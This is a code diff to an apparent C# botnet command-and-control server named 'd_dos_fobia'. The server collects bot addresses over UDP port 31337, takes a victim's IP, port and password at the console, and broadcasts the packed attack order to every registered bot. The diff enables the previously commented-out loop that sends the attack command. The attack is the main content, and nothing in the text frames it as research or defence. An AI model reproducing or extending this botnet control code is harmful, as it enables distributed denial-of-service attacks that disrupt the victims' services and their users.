@@ -26,6 +26,7 @@ namespace Server
 
 		public static void Main(string[] args)
 		{
+			Console.WriteLine("Command and control server d_dos_fobia active");
 			UdpClient udpServer = new UdpClient(31337);
 			Thread listenThread = new Thread(()=>
 			{
@@ -37,7 +38,7 @@ namespace Server
 																   //Console.WriteLine(BitConverter.ToInt32(data, 0));
 																   //Console.WriteLine("data " + remoteEP.ToString());
 					ip_port_bots.Add(new IPEndPoint(remoteEP.Address, BitConverter.ToUInt16(data, 0)));
-					DisplaySet(ip_port_bots);
+					//DisplaySet(ip_port_bots);
 					//udpServer.Send(new byte[] { 1 }, 1, remoteEP); // reply back
 				}
 
@@ -55,14 +56,24 @@ namespace Server
 			string pass_vic = Console.ReadLine();
 
 			byte[] ip_vic_arr = BitConverter.GetBytes((Int32)IPAddress.Parse(ip_vic).Address),
-				port_vic_arr = BitConverter.GetBytes(port_vic),
-				pass_vic_arr= Encoding.Default.GetBytes(pass_vic);
+				port_vic_arr = BitConverter.GetBytes((Int16)port_vic),
+				pass_vic_arr = Encoding.Default.GetBytes(pass_vic);
+
+			string name = "d_dos_fobia";
+			int len = name.Length;
+			for (int i = 0; i < 32 - len; i++)
+				name = name + "\0";
+			byte[] name_vic_arr = Encoding.Default.GetBytes(name);
+
+			byte[] to_send = Combine(ip_vic_arr, port_vic_arr, pass_vic_arr, name_vic_arr);
+
+
 
 			Console.WriteLine("attacking victim on IP "+ip_vic+", port "+port_vic+" with "+ip_port_bots.Count+" bots");
-			//foreach (IPEndPoint endPoint in ip_port_bots)
-			//{
-			//	udpServer.Send(new byte[], endPoint); // reply back
-			//}
+			foreach (IPEndPoint endPoint in ip_port_bots)
+			{
+				udpServer.Send(to_send,to_send.Length, endPoint); // reply back
+			}
 
 
 		}
@@ -76,6 +87,18 @@ namespace Server
 				Console.Write(endPoint.ToString());
 			}
 			Console.WriteLine(" }");
+		}
+
+		public static byte[] Combine(byte[] first, byte[] second, byte[] third, byte[] fourth)
+		{
+			byte[] ret = new byte[first.Length + second.Length + third.Length + fourth.Length];
+			Buffer.BlockCopy(first, 0, ret, 0, first.Length);
+			Buffer.BlockCopy(second, 0, ret, first.Length, second.Length);
+			Buffer.BlockCopy(third, 0, ret, first.Length + second.Length,
+							 third.Length);
+			Buffer.BlockCopy(fourth, 0, ret, first.Length + second.Length + third.Length,
+							 fourth.Length);
+			return ret;
 		}
 	}
 }
